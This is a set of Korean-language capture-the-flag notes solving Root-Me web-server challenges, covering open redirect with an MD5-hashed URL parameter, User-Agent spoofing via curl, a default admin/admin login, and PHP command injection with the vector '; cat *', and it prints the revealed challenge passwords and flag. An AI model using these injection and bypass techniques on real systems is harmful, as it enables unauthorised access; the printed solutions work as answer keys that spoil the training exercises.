# Server
## HTML - Source code
* HTML 파일에 주석처리 되어있음.

## HTTP - Open redirect
### Open Redirection Vulnerabilities
  * 애플리케이션이 사용자 입력을 받아 리다이렉션하기 위해 사용할 때 사용자 브라우저에게 요청한 것과는
    다른 URL을 방문하게 지시하는 취약점.
  * => 보통 스푸핑된 XSS 로 연계하기 위해 스푸핑된 웹사이트로 방문을 유도함. (피싱)
### 리다이렉션 취약점 발견과 악용
  * HTTP 리다이렉트는 리다이렉트의 대상을 지정하는 3xx 상태 코드와 Location 헤더 메시지를 사용한다.
  * 일정 시간이 지난 후에 HTTP 리프레시 헤더는 임의의 URL로 페이지를 다시 로드하는 데 사용할 수 있다.
    그 시간 간격을 인터벌이라고 하는데, 임의의 URL로 즉시 리다이렉트시키기 위해 그 값이 0이 될 수도 있다.
  * HTTP 헤더에 표기할 수 있는 내용을 HTML <meta> 태그를 통해 정의할 수 있으므로 이런 meta 태그를 이용해
    리다이렉션이 가능하다.
  * 임의의 URL로 브라우저를 리다이렉트하기 위해 자바스크립트의 다양한 API를 사용할 수 있다.
### Solution
```html
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>
```
* url 매개변수에 주소와 그 주소를 인코딩한 값을 넣어서 검증 후 리다이렉션 시킨다.
* https://emn178.github.io/online-tools/md5.html 확인해보니 md5이다.
* 어디로 리다이렉션 시켜야 문제가 해결될까 고민을 하다가 일단 아무곳이나 시도해보았다.
* ?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f 
* 그러면 짧게나마 password가 보일 것이다.

## HTTP-User-agent
* (프록시 툴이 없어서 하는 똥꼬쑈!) **군머**
* chrome debugger tools 에서 network 창 - copy - copy cURL or copy fetch 로 시도해보자.
* fetch는 몰랐는데 Promise 객체를 반환해주는듯?
```bash
curl 'http://challenge01.root-me.org/web-serveur/ch2/' 
-H 'Connection: keep-alive' 
-H 'Cache-Control: max-age=0' 
-H 'Upgrade-Insecure-Requests: 1' 
-H 'User-agent: admin' 
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' 
-H 'Accept-Encoding: gzip, deflate' 
-H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' --compressed --insecure<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27</h3></body></html>
```

## Weak password
* Try as 'admin', 'admin'

## PHP-Command injection
* attack vector : ; cat *
```php
<!--?php 
$flag = "S3rv1ceP1n9Sup3rS3cure";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?-->
```
